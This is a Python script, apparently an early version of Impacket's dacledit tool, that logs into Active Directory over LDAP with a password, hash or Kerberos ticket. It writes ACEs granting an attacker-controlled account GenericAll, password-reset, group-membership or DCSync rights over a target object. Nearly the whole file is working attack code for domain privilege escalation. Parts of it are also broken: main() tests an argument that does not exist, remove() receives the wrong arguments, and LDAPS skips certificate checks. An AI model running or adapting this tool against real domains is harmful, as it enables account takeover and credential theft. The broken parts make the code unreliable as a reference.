#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Python script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer
#
# Authors:
#   Charlie Bromberg (@_nwodtuhs)
#   @BlWasp_
#

import argparse
import logging
import sys
import traceback
import ldap3
import ssl
import ldapdomaindump
from binascii import unhexlify
from enum import Enum
from ldap3.protocol.formatters.formatters import format_sid

from impacket import version
from impacket.examples import logger, utils
from impacket.ldap import ldaptypes
from impacket.smbconnection import SMBConnection
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from ldap3.utils.conv import escape_filter_chars
from ldap3.protocol.microsoft import security_descriptor_control
from impacket.uuid import string_to_bin, bin_to_string

class RIGHTS_GUID(Enum):
    DS_REPLICATION_GET_CHANGES = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    DS_REPLICATION_GET_CHANGES_ALL = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
    WRITE_MEMBERS = "bf9679c0-0de6-11d0-a285-00aa003049e2"
    RESET_PASSWORD = "00299570-246d-11d0-a768-00aa006e0529"

def get_machine_name(args, domain):
    if args.dc_ip is not None:
        s = SMBConnection(args.dc_ip, args.dc_ip)
    else:
        s = SMBConnection(domain, domain)
    try:
        s.login('', '')
    except Exception:
        if s.getServerName() == '':
            raise Exception('Error while anonymous logging into %s' % domain)
    else:
        s.logoff()
    return s.getServerName()


def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='', nthash='', aesKey='', kdcHost=None,
                         TGT=None, TGS=None, useCache=True):
    from pyasn1.codec.ber import encoder, decoder
    from pyasn1.type.univ import noValue
    """
    logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
    :param string user: username
    :param string password: password for the user
    :param string domain: domain where the account is valid for (required)
    :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
    :param string nthash: NTHASH used to authenticate using hashes (password is not used)
    :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
    :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
    :param struct TGT: If there's a TGT available, send the structure here and it will be used
    :param struct TGS: same for TGS. See smb3.py for the format
    :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
    :return: True, raises an Exception if error.
    """

    if lmhash != '' or nthash != '':
        if len(lmhash) % 2:
            lmhash = '0' + lmhash
        if len(nthash) % 2:
            nthash = '0' + nthash
        try:  # just in case they were converted already
            lmhash = unhexlify(lmhash)
            nthash = unhexlify(nthash)
        except TypeError:
            pass

    # Importing down here so pyasn1 is not required if kerberos is not used.
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    import datetime

    if TGT is not None or TGS is not None:
        useCache = False

    target = 'ldap/%s' % target
    if useCache:
        domain, user, TGT, TGS = CCache.parseFile(domain, user, target)

    # First of all, we need to get a TGT for the user
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    if TGT is None:
        if TGS is None:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash,
                                                                    aesKey, kdcHost)
    else:
        tgt = TGT['KDC_REP']
        cipher = TGT['cipher']
        sessionKey = TGT['sessionKey']

    if TGS is None:
        serverName = Principal(target, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher,
                                                                sessionKey)
    else:
        tgs = TGS['KDC_REP']
        cipher = TGS['cipher']
        sessionKey = TGS['sessionKey']

        # Let's build a NegTokenInit with a Kerberos REQ_AP

    blob = SPNEGO_NegTokenInit()

    # Kerberos
    blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

    # Let's extract the ticket from the TGS
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs['ticket'])

    # Now let's build the AP_REQ
    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = []
    apReq['ap-options'] = constants.encodeFlags(opts)
    seq_set(apReq, 'ticket', ticket.to_asn1)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = domain
    seq_set(authenticator, 'cname', userName.components_to_asn1)
    now = datetime.datetime.utcnow()

    authenticator['cusec'] = now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 11
    # AP-REQ Authenticator (includes application authenticator
    # subkey), encrypted with the application session key
    # (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

    blob['MechToken'] = encoder.encode(apReq)

    request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO',
                                                  blob.getData())

    # Done with the Kerberos saga, now let's get into LDAP
    if connection.closed:  # try to open connection if closed
        connection.open(read_server_info=False)

    connection.sasl_in_progress = True
    response = connection.post_send_single_response(connection.send('bindRequest', request, None))
    connection.sasl_in_progress = False
    if response[0]['result'] != 0:
        raise Exception(response)

    connection.bound = True

    return True



# Create an ALLOW ACE with the specified sid
def create_access_allowed_ace(access_mask, sid):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = access_mask
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    nace['Ace'] = acedata
    return nace

# Create an object ACE with the specified privguid and our sid
def create_access_allowed_object_ace(privguid, sid):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
    acedata['ObjectType'] = string_to_bin(privguid)
    acedata['InheritedObjectType'] = b''
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    assert sid == acedata['Sid'].formatCanonical()
    acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
    nace['Ace'] = acedata
    return nace

class DACLedit(object):
    """docstring for setrbcd"""

    def __init__(self, ldap_server, ldap_session, target_account):
        super(DACLedit, self).__init__()
        self.ldap_server = ldap_server
        self.ldap_session = ldap_session
        self.controlled_account = None
        self.controlled_account_sid = None
        self.target_account = target_account
        self.target_principal = None
        logging.debug('Initializing domainDumper()')
        cnf = ldapdomaindump.domainDumpConfig()
        cnf.basepath = None
        self.domain_dumper = ldapdomaindump.domainDumper(self.ldap_server, self.ldap_session, cnf)

    def read(self):
        # Set SD flags to only query for DACL
        controls = security_descriptor_control(sdflags=0x04)
        self.ldap_session.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(self.target_account), attributes=['SAMAccountName', 'nTSecurityDescriptor'], controls=controls)
        try:
            self.target_principal = self.ldap_session.entries[0]
            secDescData = self.target_principal['nTSecurityDescriptor'].raw_values[0]
            secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
            # todo we now need to pars the DACL to print an ACE type, mask, SID, rights, etc.
            # for ace in secDesc['Dacl']['Data']:
            #     print(ace)
        except IndexError:
            logging.error('Principal not found in LDAP: %s' % self.target_account)
            return False
        return

    def write(self, controlled_account, rights, rights_guid):
        self.controlled_account = controlled_account
        result = self.get_user_info(self.controlled_account)
        if not result:
            logging.error('Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)')
            return
        self.controlled_account_sid = str(result[1])
        logging.debug("Controlled account SID: %s" % self.controlled_account_sid)

        # Set SD flags to only query for DACL
        controls = security_descriptor_control(sdflags=0x04)
        self.ldap_session.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(self.target_account), attributes=['SAMAccountName', 'nTSecurityDescriptor'], controls=controls)
        try:
            self.target_principal = self.ldap_session.entries[0]
        except IndexError:
            logging.error('Principal not found in LDAP: %s' % self.target_account)
            return False
        secDescData = self.target_principal['nTSecurityDescriptor'].raw_values[0]
        secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
        if rights == "GenericAll" and rights_guid is None:
            logging.info("Appending ACE (%s --(GENERIC_ALL)--> %s)" % (self.controlled_account_sid, self.target_account))
            # todo check if rights already there, not changing if they are
            secDesc['Dacl']['Data'].append(create_access_allowed_ace(ldaptypes.ACCESS_MASK.GENERIC_ALL, self.controlled_account_sid))
            pass
        else:
            rights_guids = []
            if rights_guid is not None:
                rights_guids = [ rights_guid ]
            elif rights == "WriteMembers":
                rights_guids = [ RIGHTS_GUID.WRITE_MEMBERS ]
            elif rights == "ResetPassword":
                rights_guids = [ RIGHTS_GUID.RESET_PASSWORD ]
            elif rights == "DCSync":
                rights_guids = [ RIGHTS_GUID.DS_REPLICATION_GET_CHANGES,
                                 RIGHTS_GUID.DS_REPLICATION_GET_CHANGES_ALL ]
            for rights_guid in rights_guids:
                # todo check if rights already there, not changing if they are
                logging.info("Appending ACE (%s --(%s)--> %s)" % (self.controlled_account_sid, rights_guid.name, self.target_account))
                secDesc['Dacl']['Data'].append(create_access_allowed_object_ace(rights_guid.value, self.controlled_account_sid))
        dn = self.target_principal.entry_dn
        data = secDesc.getData()
        self.ldap_session.modify(dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [data])}, controls=controls)
        if self.ldap_session.result['result'] == 0:
            logging.info('DACL modified successfully!')
        else:
            if self.ldap_session.result['result'] == 50:
                logging.error('Could not modify object, the server reports insufficient rights: %s',
                              self.ldap_session.result['message'])
            elif self.ldap_session.result['result'] == 19:
                logging.error('Could not modify object, the server reports a constrained violation: %s',
                              self.ldap_session.result['message'])
            else:
                logging.error('The server returned an error: %s', self.ldap_session.result['message'])
        return

    def remove(self, controlled_account, rights_guid):
        # todo, we need to parse a DACL
        pass

    def flush(self):
        # todo but implement a check, it could be a reeeeeaaally bad idea to flush an object DACL
        pass

    def backup(self, controlled_account, backup_filename):
        # todo, check the format of the restore file when using ntlmrelayx, it could be nice to bring support for this, aclpwn is a bit old and not maintained anymore
        pass

    def restore(self, controlled_account, backup_filename):
        # todo, check the format of the restore file when using ntlmrelayx, it could be nice to bring support for this, aclpwn is a bit old and not maintained anymore
        pass

    def get_user_info(self, samname):
        self.ldap_session.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            sid = format_sid(self.ldap_session.entries[0]['objectSid'].raw_values[0])
            return dn, sid
        except IndexError:
            logging.error('User not found in LDAP: %s' % samname)
            return False


def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='Python editor for a principal\'s DACL.')
    parser.add_argument('identity', action='store', help='domain.local/username[:password]')
    parser.add_argument("-from", dest="controlled_account", type=str, required=False, help="Attacker controlled principal to add for the ACE")
    parser.add_argument("-to", dest="target_account", type=str, required=False, help="Target principal the attacker has WriteDACL to")
    parser.add_argument('-action', choices=['read', 'write', 'remove'], nargs='?', default='read', help='Action to operate on the DACL')
    parser.add_argument('-rights', choices=['GenericAll', 'ResetPassword', 'WriteMembers', 'DCSync'], nargs='?', default='GenericAll', help='Rights to write/remove in the target DACL')
    parser.add_argument('-rights-guid', type=str, help='Manual GUID representing the right to add to the target')
    parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) '
                                                       'based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller or KDC (Key Distribution Center)'
                                                                            ' for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return parser.parse_args()


def parse_identity(args):
    domain, username, password = utils.parse_credentials(args.identity)

    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if password == '' and username != '' and args.hashes is None and args.no_pass is False and args.aesKey is None:
        from getpass import getpass
        logging.info("No credentials supplied, supply password")
        password = getpass("Password:")

    if args.aesKey is not None:
        args.k = True

    if args.hashes is not None:
        lmhash, nthash = args.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    return domain, username, password, lmhash, nthash


def init_logger(args):
    # Init the example's logger theme and debug level
    logger.init(args.ts)
    if args.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)


def init_ldap_connection(target, tls_version, args, domain, username, password, lmhash, nthash):
    user = '%s\\%s' % (domain, username)
    if tls_version is not None:
        use_ssl = True
        port = 636
        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=tls_version)
    else:
        use_ssl = False
        port = 389
        tls = None
    ldap_server = ldap3.Server(target, get_info=ldap3.ALL, port=port, use_ssl=use_ssl, tls=tls)
    if args.k:
        ldap_session = ldap3.Connection(ldap_server)
        ldap_session.bind()
        ldap3_kerberos_login(ldap_session, target, username, password, domain, lmhash, nthash, args.aesKey, kdcHost=args.dc_ip)
    elif args.hashes is not None:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=lmhash + ":" + nthash, authentication=ldap3.NTLM, auto_bind=True)
    else:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=password, authentication=ldap3.NTLM, auto_bind=True)

    return ldap_server, ldap_session


def init_ldap_session(args, domain, username, password, lmhash, nthash):
    if args.k:
        target = get_machine_name(args, domain)
    else:
        if args.dc_ip is not None:
            target = args.dc_ip
        else:
            target = domain

    if args.use_ldaps is True:
        try:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1_2, args, domain, username, password, lmhash, nthash)
        except ldap3.core.exceptions.LDAPSocketOpenError:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1, args, domain, username, password, lmhash, nthash)
    else:
        return init_ldap_connection(target, None, args, domain, username, password, lmhash, nthash)


def main():
    print(version.BANNER)
    args = parse_args()
    init_logger(args)

    if args.action == 'write' and args.delegate_from is None:
        logging.critical('`-delegate-from` should be specified when using `-action write` !')
        sys.exit(1)

    domain, username, password, lmhash, nthash = parse_identity(args)
    if len(nthash) > 0 and lmhash == "":
        lmhash = "aad3b435b51404eeaad3b435b51404ee"

    try:
        ldap_server, ldap_session = init_ldap_session(args, domain, username, password, lmhash, nthash)
        dacledit = DACLedit(ldap_server, ldap_session, args.target_account)
        if args.action == 'read':
            dacledit.read()
        elif args.action == 'write':
            dacledit.write(args.controlled_account, args.rights, args.rights_guid)
        elif args.action == 'remove':
            dacledit.remove(args.controlled_account, args.rights, args.rights_guid)
        elif args.action == 'flush':
            dacledit.flush()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            traceback.print_exc()
        logging.error(str(e))


if __name__ == '__main__':
    main()
